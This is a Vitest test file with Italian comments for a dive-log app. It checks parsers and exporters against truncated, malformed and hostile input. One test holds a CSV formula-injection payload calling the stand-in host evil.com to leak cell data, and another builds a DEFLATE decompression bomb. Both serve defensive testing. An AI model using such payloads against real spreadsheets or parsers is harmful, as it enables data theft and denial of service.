/**
 * I FILE CHE NESSUNO AVEVA PENSATO DI RICEVERE.
 *
 * ════════════════════════════════════════════════════════════════════════════
 * Quindici difetti trovati il 15 settembre 2026 dando in pasto ai lettori file
 * troncati, danneggiati, con valori impossibili e con contenuti ostili. Quasi
 * tutti hanno la stessa forma, che è la forma peggiore: **un dato falso e
 * plausibile al posto di un errore**. Un'eccezione si vede; un'immersione di
 * quaranta secondi a trenta metri no.
 *
 * Ognuna delle prove qui sotto è stata vista rossa prima della correzione.
 */

import { describe, expect, it } from 'vitest';
import { readFileSync } from 'node:fs';
import { parseFile } from '../src/core/parsers';
import { csvParser, parseNumber, plausibile, righeCsv } from '../src/core/parsers/csv';
import { parseXmlSalvando } from '../src/core/parsers/xml';
import { diveIdFor } from '../src/core/dedupe';
import { esportaCsv } from '../src/core/export/csv';
import { inflateRaw } from '../src/core/parsers/inflate';
import type { Dive } from '../src/core/model';

const UDDF = readFileSync('demo/shearwater-cloud-export.uddf', 'utf8');
const SSRF = readFileSync('demo/subsurface-archivio.ssrf', 'utf8');

describe('un file XML che finisce a metà', () => {
  it('salva le immersioni complete invece di perdere tutto', async () => {
    /*
     * Diciotto immersioni, tagliate al 60%: diciassette erano leggibili per
     * intero e ne arrivavano **zero**, perché `parseXml` non era dentro nessun
     * `try` in nessuno dei tre lettori XML.
     */
    const r = await parseFile({ fileName: 'x.uddf', text: UDDF.slice(0, Math.floor(UDDF.length * 0.6)) });
    expect(r.dives.length).toBeGreaterThan(5);
    expect(r.warnings.join(' ')).toContain('finisce a metà');
  });

  it('lo dice anche quando la libreria non si lamenta', () => {
    /*
     * fast-xml-parser è tollerante: su un taglio che cade fra due elementi
     * restituisce quello che ha letto senza un'eccezione. Lo stesso file
     * tagliato al 30% passava liscio consegnando sei immersioni su diciotto,
     * **senza un avviso**. Il segno che resta è che il documento non chiude il
     * suo elemento radice.
     */
    const letto = parseXmlSalvando(SSRF.slice(0, Math.floor(SSRF.length * 0.3)), 'dive');
    expect(letto.tagliato).toBe(true);
  });

  it('e quando non c’è niente da salvare parla italiano, non la lingua della libreria', async () => {
    /*
     * La stringa che finiva a schermo, accanto al nome del file:
     * «readTagExp returned undefined at position 742510. Context: "<tankpres…»
     * È lo stesso difetto che `causaGuasto.ts` ha chiuso per il Bluetooth.
     */
    const r = await parseFile({ fileName: 'x.ssrf', text: SSRF.slice(0, 200) });
    expect(r.dives).toHaveLength(0);
    expect(r.warnings.join(' ')).toContain('incompleto o danneggiato');
    expect(r.warnings.join(' ')).not.toContain('readTagExp');
  });

  it('un file intero non viene dichiarato tagliato', () => {
    // Senza questa riga, «tagliato: true» sempre passerebbe tutte le altre.
    expect(parseXmlSalvando(UDDF, 'dive').tagliato).toBe(false);
  });
});

describe('il backup dell’applicazione non è un CSV', () => {
  it('non viene rivendicato dal lettore CSV', () => {
    /*
     * `SyncPage` lo scrive con `JSON.stringify` compatto: una riga sola che
     * contiene `"durationS":`, `"maxdepth":`, `"notes":` — tre «intestazioni»
     * riconosciute, che bastavano. Il file veniva preso per un CSV e usciva
     * «CSV senza righe di dati», zero immersioni: cioè il gesto suggerito dalla
     * pagina dei computer, trascinare il proprio backup, non funzionava.
     */
    const backup = JSON.stringify({
      format: 'mydivelog-backup',
      dives: [{ id: 'a', durationS: 2400, maxdepth: 30, notes: 'x', buddy: 'y', site: 'z' }],
    });
    expect(csvParser.detect({ fileName: 'b.json', text: backup })).toBe(false);
  });
});

describe('il CSV che l’applicazione esporta, l’applicazione lo rilegge', () => {
  const dive: Dive = {
    id: 'a',
    startTime: '2026-06-14T10:38:00Z',
    durationS: 2520,
    maxDepth: 32.4,
    mode: 'oc',
    cylinders: [{ mix: { o2: 0.21, he: 0 } }],
    source: { format: 'manual', file: '', importedAt: '2026-06-14T20:00:00Z' },
    tags: [],
    site: { name: 'Punta Mesco' },
  };

  it('la riga `sep=;` in cima non fa più dire «formato non riconosciuto»', async () => {
    const { csv } = esportaCsv([dive], {});
    expect(csv.split('\n')[0]).toMatch(/^﻿?sep=/);
    const r = await parseFile({ fileName: 'mio.csv', text: csv });
    expect(r.dives).toHaveLength(1);
    expect(r.dives[0].site?.name).toBe('Punta Mesco');
  });

  it('e una formula nel nome del sito esce disinnescata', () => {
    /*
     * Le virgolette del CSV non proteggono: Excel le toglie e poi valuta la
     * cella. Un logbook ricevuto da un compagno diventava un vettore.
     */
    const ostile = { ...dive, site: { name: '=HYPERLINK("http://evil.example/?d="&A1,"Clicca")' } };
    const { csv } = esportaCsv([ostile], {});
    expect(csv).not.toMatch(/;"?=HYPERLINK/);
    expect(csv).toContain('"\'=HYPERLINK');
  });
});

describe('numeri che non sono numeri', () => {
  it('la notazione scientifica non viene mutilata in un numero plausibile', () => {
    // `1e9` diventava 19: una cella così in durata e profondità produceva
    // un'immersione di 19 minuti a 19 metri, importata senza un avviso.
    expect(parseNumber('1e9')).toBe(1e9);
    expect(parseNumber('3.05e1')).toBe(30.5);
    expect(parseNumber('2e-3')).toBe(0.002);
    // E quello che resta vero: virgola decimale, separatore delle migliaia, unità.
    expect(parseNumber('18,3')).toBe(18.3);
    expect(parseNumber('1.234')).toBe(1.234);
    expect(parseNumber('60 ft')).toBe(60);
  });

  it('il filtro di plausibilità tiene fuori quello che non può esistere', () => {
    expect(plausibile(-2400, 1, 86_400)).toBeUndefined();
    expect(plausibile(2400, 1, 86_400)).toBe(2400);
    expect(plausibile(NaN, 0, 10)).toBeUndefined();
    expect(plausibile(undefined, 0, 10)).toBeUndefined();
  });

  it('una riga con valori impossibili viene scartata invece di entrare', async () => {
    const csv = [
      'Date;Time;Duration;Max Depth;Min Temp;Rating',
      '2026-06-14;10:38;-2400;-30.5;-273;99',
      '2026-06-14;12:00;40;30.5;18;4',
    ].join('\n');
    const r = await parseFile({ fileName: 'x.csv', text: csv });
    expect(r.dives).toHaveLength(1);
    expect(r.dives[0].maxDepth).toBe(30.5);
    expect(r.warnings.join(' ')).toContain('scartate');
  });

  it('un anno impossibile non entra come data certa', async () => {
    const csv = ['Date;Time;Duration;Max Depth', '9999-12-31;10:00;40;30'].join('\n');
    const r = await parseFile({ fileName: 'x.csv', text: csv });
    expect(r.dives).toHaveLength(0);
  });

  it('una miscela che somma a più del tutto ricade sull’aria', async () => {
    // `o2=3200` diventava una frazione di 32, cioè il 3200% di ossigeno: il
    // motore si difende, l'esposizione all'ossigeno no (CNS 70% invece di 11%).
    const csv = ['Date;Time;Duration;Max Depth;O2;He', '2026-06-14;10:38;40;30;3200;0'].join('\n');
    const r = await parseFile({ fileName: 'x.csv', text: csv });
    expect(r.dives[0].cylinders[0].mix.o2).toBe(0.21);
  });
});

describe('un a capo dentro le virgolette non spezza il record', () => {
  it('le note su due righe restano intere', () => {
    const testo = 'a,b\n1,"riga uno\nriga due"\n2,ok';
    expect(righeCsv(testo)).toHaveLength(3);
    expect(righeCsv(testo)[1]).toContain('riga due');
  });

  it('le virgolette raddoppiate non aprono e chiudono a caso', () => {
    expect(righeCsv('a\n"lui disse ""ciao""\ne poi"')).toHaveLength(2);
  });
});

describe('due immersioni diverse non diventano una', () => {
  it('l’indice interno del computer non basta senza il seriale', () => {
    /*
     * Due Perdix hanno entrambi un'immersione numero 7. Senza `<computerSerial>`
     * la chiave era `dc|Perdix||7` per tutti i Perdix del mondo: due immersioni
     * a sette settimane e dodici metri di distanza venivano fuse, e la
     * schermata annunciava «1 duplicato».
     */
    const a = {
      startTime: '2026-06-14T10:38:00Z',
      maxDepth: 30,
      durationS: 2400,
      computer: { model: 'Perdix', diveId: '7' },
    };
    const b = { ...a, startTime: '2026-08-02T09:12:00Z', maxDepth: 18, durationS: 1800 };
    expect(diveIdFor(a)).not.toBe(diveIdFor(b));
    // E col seriale la chiave torna quella forte, che è il caso normale.
    const conSeriale = { ...a, computer: { ...a.computer, deviceId: 'ABC123' } };
    const conSerialeAltroOrario = { ...conSeriale, startTime: '2026-06-14T10:40:00Z' };
    expect(diveIdFor(conSeriale)).toBe(diveIdFor(conSerialeAltroOrario));
  });
});

describe('una bomba di compressione non mangia la memoria', () => {
  it('un flusso che si gonfia oltre il tetto viene fermato', () => {
    /*
     * Il DEFLATE comprime fino a 1032:1. Un `.db` da 264 kB allocava 372 MB;
     * uno da 3 MB arrivava a 5.5 GB e 36 secondi. Su un telefono il sistema
     * uccide l'applicazione nel mezzo di un'importazione.
     *
     * Il blocco «non compresso» del DEFLATE dichiara la sua lunghezza in
     * quattro byte, quindi bastano pochi byte ripetuti per chiedere gigabyte.
     */
    const blocco: number[] = [];
    // 2000 blocchi non finali da 65 535 byte dichiarati = 131 MB, sopra il tetto.
    for (let i = 0; i < 2000; i++) blocco.push(0x00, 0xff, 0xff, 0x00, 0x00);
    expect(() => inflateRaw(new Uint8Array(blocco))).toThrow();
    const errore = (() => {
      try {
        inflateRaw(new Uint8Array(blocco));
      } catch (e) {
        return (e as Error).message;
      }
      return '';
    })();
    expect(errore).toMatch(/sproporzionato|danneggiato|troncat/i);
  });
});

describe('l’ora che il file dichiara è l’ora che si mostra', () => {
  it('UDDF: il fuso scritto nel file non si butta', async () => {
    /*
     * `<datetime>…+02:00</datetime>` dice che l'immersione è cominciata alle
     * 10:38 ORA DEL POSTO. `wallClockToIso` convertiva correttamente in UTC e
     * poi l'offset spariva: la scheda mostrava 08:38, un'ora in cui nessuno si
     * è immerso. `logtrak.ts` lo conservava da mesi.
     */
    const uddf = `<?xml version="1.0"?><uddf version="3.2"><profiledata><repetitiongroup><dive>
      <informationbeforedive><datetime>2026-06-14T10:38:00+02:00</datetime></informationbeforedive>
      <samples><waypoint><divetime>0</divetime><depth>0</depth></waypoint>
      <waypoint><divetime>600</divetime><depth>30</depth></waypoint>
      <waypoint><divetime>2400</divetime><depth>0</depth></waypoint></samples>
      <informationafterdive><greatestdepth>30</greatestdepth><diveduration>2400</diveduration></informationafterdive>
      </dive></repetitiongroup></profiledata></uddf>`;
    const r = await parseFile({ fileName: 'x.uddf', text: uddf });
    expect(r.dives).toHaveLength(1);
    expect(r.dives[0].startTime).toBe('2026-06-14T08:38:00.000Z');
    expect(r.dives[0].utcOffsetMinutes).toBe(120);
  });

  it('e un file senza fuso non se ne inventa uno', async () => {
    const uddf = `<?xml version="1.0"?><uddf version="3.2"><profiledata><repetitiongroup><dive>
      <informationbeforedive><datetime>2026-06-14T10:38:00</datetime></informationbeforedive>
      <samples><waypoint><divetime>0</divetime><depth>0</depth></waypoint>
      <waypoint><divetime>2400</divetime><depth>30</depth></waypoint></samples>
      <informationafterdive><greatestdepth>30</greatestdepth><diveduration>2400</diveduration></informationafterdive>
      </dive></repetitiongroup></profiledata></uddf>`;
    const r = await parseFile({ fileName: 'x.uddf', text: uddf });
    expect(r.dives[0].utcOffsetMinutes).toBeUndefined();
  });
});
